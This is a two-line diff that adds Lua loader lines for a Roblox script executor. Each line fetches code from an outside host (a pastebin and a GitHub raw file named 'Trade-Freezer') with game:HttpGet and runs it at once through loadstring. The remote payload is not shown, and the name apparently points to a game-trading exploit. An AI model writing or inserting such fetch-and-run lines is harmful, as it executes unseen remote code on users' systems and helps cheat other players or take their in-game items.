@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://paste.debian.net/plainh/88db48c2/", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DevPilotZero/GAG/refs/heads/main/Trade-Freezer"))()
